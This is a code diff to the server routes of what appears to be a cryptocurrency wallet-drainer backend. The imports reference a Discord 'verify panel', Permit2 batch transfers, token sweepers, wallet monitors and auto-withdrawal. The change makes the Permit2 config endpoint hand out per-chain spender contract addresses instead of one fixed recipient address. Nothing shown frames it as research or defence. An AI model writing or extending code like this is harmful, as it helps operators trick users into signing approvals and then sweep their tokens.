@@ -4,7 +4,7 @@ import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
 import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
-import { getRelayerAddress, executePermit2BatchTransfer } from "./permit2-relayer";
+import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain, CHAIN_CONTRACTS } from "./permit2-relayer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
@@ -387,15 +387,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.get("/api/permit2-config", async (req, res) => {
     try {
-      const spenderAddress = getRelayerAddress();
-      if (!spenderAddress) {
-        return res.status(500).json({ error: "Relayer not configured" });
+      const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
+      
+      if (chainId) {
+        const contractAddress = getContractForChain(chainId);
+        if (!contractAddress) {
+          return res.status(400).json({ error: `No contract deployed for chain ${chainId}` });
+        }
+        res.json({
+          spenderAddress: contractAddress,
+          permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+          contractAddress,
+        });
+      } else {
+        res.json({
+          permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+          chainContracts: CHAIN_CONTRACTS,
+        });
       }
-      res.json({
-        spenderAddress,
-        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-        recipientAddress: "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f",
-      });
     } catch (error) {
       res.status(500).json({ error: "Failed to get Permit2 config" });
     }
